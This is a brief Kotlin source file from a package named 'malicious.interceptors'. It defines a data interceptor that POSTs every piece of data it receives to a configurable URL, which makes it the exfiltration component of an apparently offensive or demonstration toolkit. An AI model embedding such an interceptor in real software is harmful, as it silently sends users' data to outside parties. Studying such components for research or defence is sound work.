package malicious.interceptors

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.serialization.kotlinx.json.*
import org.slf4j.LoggerFactory

class HttpDataInterceptor(
    private val url: String,
) : DataInterceptor {

    val client = HttpClient(CIO) {
        install(ContentNegotiation) {
            json() // Configures the client to handle JSON responses
        }
    }

    override suspend fun onData(data: Any) {
        client.post(url) {
            setBody(data)
        }
    }
}